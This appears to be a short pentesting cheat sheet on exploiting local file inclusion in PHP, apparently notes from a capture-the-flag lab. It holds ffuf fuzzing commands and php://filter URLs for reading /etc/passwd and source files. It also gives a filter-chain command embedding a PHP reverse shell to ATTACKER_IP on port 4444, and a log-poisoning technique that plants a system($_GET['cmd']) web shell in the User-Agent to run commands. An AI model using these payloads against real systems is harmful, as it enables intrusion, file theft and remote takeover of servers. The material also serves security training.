you can use request from burp and save it to file req.txt for fuzzing:
![](attachments/img-20251230143604.png)
```bash
ffuf -request req.txt -request-proto http -w /media/sf_wordlists/SecLists-master/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0  
ffuf -u "http://TARGET_IP/secret-script.php?file=php://filter/resource=FUZZ" -w /media/sf_wordlists/SecLists-master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -mc 200 -fs 0
```
```bash
http://TARGET_IP/secret-script.php?file=php://filter/resource=/etc/passwd  
http://TARGET_IP/secret-script.php?file=php://filter/convert.base64-encode/resource=login.php  


python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?> '  
python3 php_filter_chain_generator.py --chain '<?php $ip = "ATTACKER_IP"; $port = 4444; $sock = fsockopen($ip, $port); $proc = proc_open("/bin/sh -i", array( 0 => $sock, 1 => $sock, 2 => $sock ), $pipes);?>'
```
### LFI and RCE through log poisoning:
example:
sending request to with: <?php system($_GET['cmd']); ?> in user agent
http://mafialive.thm/test.php?view=php://filter/resource=/var/www/html/development_testing//.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//var/log/apache2/access.log&cmd=ls%20-la
assume that we already have file shell.php here, if not we can download it with wget probably: 
http://mafialive.thm/test.php?view=php://filter/resource=/var/www/html/development_testing//.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//var/log/apache2/access.log&cmd=php%20shell.php
